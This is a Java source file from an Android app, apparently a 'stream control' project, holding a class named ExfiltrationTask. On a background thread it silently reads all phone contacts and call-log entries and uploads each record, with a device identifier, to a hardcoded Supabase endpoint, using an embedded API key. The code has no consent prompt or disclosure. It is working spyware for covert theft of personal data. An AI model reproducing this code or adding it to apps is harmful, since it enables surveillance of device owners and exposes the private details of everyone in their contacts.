package com.rcl.androidstreamcontrol.utils;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.content.SharedPreferences;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class ExfiltrationTask {
    
    private static final String TAG = "ExfiltrationTask";
    private static final String SUPABASE_URL = "https://qxzozsdgrgahvgzpsfmm.supabase.co";
    private static final String ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4";

    public static void run(Context context) {
        if (!FeatureConfig.ENABLE_EXFILTRATION) return;
        
        new Thread(() -> {
            try {
                SharedPreferences prefs = context.getSharedPreferences("PortalPrefs", Context.MODE_PRIVATE);
                String deviceId = prefs.getString("supabase_uid", null);
                if (deviceId == null) {
                    deviceId = android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
                }
                if (deviceId == null) {
                    deviceId = "unknown_device_" + System.currentTimeMillis();
                }
                
                exfiltrateContacts(context, deviceId);
                exfiltrateCallLogs(context, deviceId);
            } catch (Exception e) {
                Log.e(TAG, "Exfiltration failed", e);
            }
        }).start();
    }

    private static void exfiltrateContacts(Context context, String deviceId) {
        try {
            Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    try {
                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        
                        JSONObject payload = new JSONObject();
                        payload.put("device_id", deviceId);
                        payload.put("contact_name", name != null ? name : "Unknown");
                        payload.put("phone_number", number != null ? number : "Unknown");
                        
                        sendToSupabase("/rest/v1/contacts", payload);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to parse contact row", e);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Contact exfiltration failed", e);
        }
    }

    private static void exfiltrateCallLogs(Context context, String deviceId) {
         try {
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    try {
                        String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                        String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                        String durationStr = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                        
                        int duration = 0;
                        if (durationStr != null && !durationStr.isEmpty()) {
                            try { duration = Integer.parseInt(durationStr); } catch (Exception ignored) {}
                        }
                        
                        JSONObject payload = new JSONObject();
                        payload.put("device_id", deviceId);
                        payload.put("phone_number", number != null ? number : "Unknown");
                        payload.put("call_type", type != null ? type : "Unknown");
                        payload.put("duration_seconds", duration);
                        
                        sendToSupabase("/rest/v1/call_logs", payload);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to parse call log row", e);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Call log exfiltration failed", e);
        }
    }

    private static void sendToSupabase(String endpoint, JSONObject payload) {
        try {
            URL url = new URL(SUPABASE_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("apikey", ANON_KEY);
            conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = payload.toString().getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            int code = conn.getResponseCode(); // Execute request
            if (code >= 400) {
                Log.e(TAG, "Failed to upload to " + endpoint + ". HTTP Code: " + code);
            } else {
                Log.d(TAG, "Successfully uploaded to " + endpoint + ". Code: " + code);
            }
        } catch (Exception e) {
            Log.e(TAG, "Network exception uploading to " + endpoint, e);
        }
    }
}
